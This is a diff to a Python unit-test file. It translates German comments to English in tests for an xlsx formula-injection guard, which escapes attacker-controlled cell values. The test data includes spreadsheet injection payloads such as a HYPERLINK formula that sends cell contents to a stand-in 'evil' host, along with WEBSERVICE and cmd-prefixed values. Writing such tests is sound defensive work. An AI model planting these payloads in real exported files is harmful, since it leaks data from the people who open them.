@@ -1,8 +1,10 @@
-"""Formula-Injection-Schutz für die xlsx-Workbook-Builder (AUD-008).
+"""Formula-injection guard for the xlsx workbook builders (AUD-008).
 
-Angreiferkontrollierte Strings (Antragstitel, Antragstellername, Formular-Daten,
-Buchungsbeschreibung) dürfen beim Öffnen in Excel/LibreOffice nicht als aktive
-Formel ausgewertet werden. Reine Unit-Tests (kein DB/Docker/Netz)."""
+Excel and LibreOffice must not evaluate an attacker-controlled string as an active
+formula. Such a string is the application title, the applicant name, the form data or
+the booking description. These are pure unit tests. They need no database, no Docker
+and no network.
+"""
 
 from __future__ import annotations
 
@@ -24,9 +26,6 @@ def _load(data: bytes) -> Any:
     return load_workbook(BytesIO(data))
 
 
-# --------------------------------------------------------------------------- #
-# _safe — Einheitstest des Helfers
-# --------------------------------------------------------------------------- #
 @pytest.mark.parametrize(
     "payload",
     [
@@ -57,9 +56,7 @@ def test_safe_passes_through_non_strings() -> None:
     assert xlsx._safe(0) == 0
 
 
-# --------------------------------------------------------------------------- #
-# build_auskunft_workbook — höchstexponierter Sink (öffentliche Antragsteller)
-# --------------------------------------------------------------------------- #
+# build_auskunft_workbook is the most exposed sink. Public applicants feed it.
 def test_auskunft_escapes_applicant_name_and_json_data() -> None:
     payload_name = '=HYPERLINK("http://evil/?"&A1,"click")'
     apps = [
@@ -79,17 +76,17 @@ def test_auskunft_escapes_applicant_name_and_json_data() -> None:
         principal=None,
     )
     ws = _load(data)["Anträge"]
-    # Zeile 2 = erste Datenzeile (Zeile 1 = Header).
+    # Row 2 is the first data row. Row 1 is the header.
     type_cell = ws.cell(row=2, column=2).value
     name_cell = ws.cell(row=2, column=5).value
     json_cell = ws.cell(row=2, column=6).value
     assert name_cell == "'" + payload_name
     assert type_cell.startswith("'=WEBSERVICE")
-    # json.dumps liefert einen mit { beginnenden String → harmlos, aber der Wert
-    # mySelect bleibt im JSON enthalten und wird nicht ausgewertet.
+    # json.dumps returns a string that starts with {, which is harmless. The mySelect
+    # value stays inside the JSON and Excel does not evaluate it.
     assert json_cell.startswith("{")
     assert "=1+2" in json_cell
-    # Keine Zelle darf als aktive Formel persistiert sein.
+    # No cell may persist as an active formula.
     for col in range(1, 7):
         val = ws.cell(row=2, column=col).value
         assert not (isinstance(val, str) and val[:1] in xlsx._FORMULA_PREFIXES)
@@ -103,16 +100,13 @@ def test_auskunft_escapes_account_principal_fields() -> None:
         principal={"sub": "=1+1", "email": "+x", "displayName": "@y", "active": True},
     )
     ws = _load(data)["Konto"]
-    # E-Mail (Anfrage) in Zeile 2.
+    # The email of the request sits in row 2.
     assert ws.cell(row=2, column=2).value.startswith("'=cmd")
     assert ws.cell(row=3, column=2).value == "'=1+1"
     assert ws.cell(row=4, column=2).value == "'+x"
     assert ws.cell(row=5, column=2).value == "'@y"
 
 
-# --------------------------------------------------------------------------- #
-# build_applications_workbook — item.title
-# --------------------------------------------------------------------------- #
 def test_applications_escapes_title() -> None:
     item = ApplicationListItem.model_validate(
         {
@@ -134,9 +128,6 @@ def test_applications_escapes_title() -> None:
     assert ws.cell(row=2, column=1).value == "'=2+5"
 
 
-# --------------------------------------------------------------------------- #
-# build_expenses_workbook — e.description
-# --------------------------------------------------------------------------- #
 class _Expense:
     def __init__(self, description: str) -> None:
         self.created_at = None
@@ -155,9 +146,6 @@ def test_expenses_escapes_description() -> None:
     assert ws.cell(row=2, column=3).value == "'=SUM(1,2)"
 
 
-# --------------------------------------------------------------------------- #
-# build_budget_workbook — node.name (indented)
-# --------------------------------------------------------------------------- #
 def test_budget_escapes_node_name() -> None:
     fy = uuid4()
     alloc = {
